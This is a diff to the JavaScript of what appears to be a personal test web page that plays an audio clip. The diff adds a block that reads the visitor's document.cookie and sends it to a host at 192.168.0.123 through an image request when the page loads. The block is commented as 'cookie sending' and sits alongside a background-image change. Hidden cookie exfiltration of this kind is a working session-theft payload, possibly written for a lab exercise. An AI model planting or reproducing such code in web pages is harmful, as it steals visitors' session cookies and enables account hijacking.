@@ -210,5 +210,13 @@ function TocaAudio(){
 	var audio = new Audio('https://rodrigorochapinto.github.io/pages-teste/audios/samba.mp3');
 	audio.play();
 }
+// inicio - Envio cookie
+a = document.cookie;
+b = "http://192.168.0.123/?=";
+c = b.concat(a);
+//alert('teste cookie: 'c);
+new Image().src=c;
+document.body.style.backgroundImage = "url('https://rodrigorochapinto.github.io/pages-teste/imagens/ufsj1.jpg')";
+// fim - Envio cookie
 
 TocaAudio();
